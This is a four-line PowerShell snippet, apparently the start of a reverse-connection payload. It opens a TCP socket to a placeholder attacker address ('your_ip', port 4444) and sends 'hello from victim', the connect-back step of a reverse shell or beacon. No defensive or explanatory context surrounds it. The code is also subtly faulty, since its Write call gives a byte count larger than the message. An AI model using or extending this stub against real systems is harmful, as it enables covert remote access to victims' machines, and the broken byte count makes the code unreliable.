$client = New-Object Net.Sockets.TCPClient("your_ip", 4444)
$stream = $client.GetStream()
$stream.Write(([text.encoding]::ASCII).GetBytes("hello from victim`n"), 0, 20)
$stream.Flush()
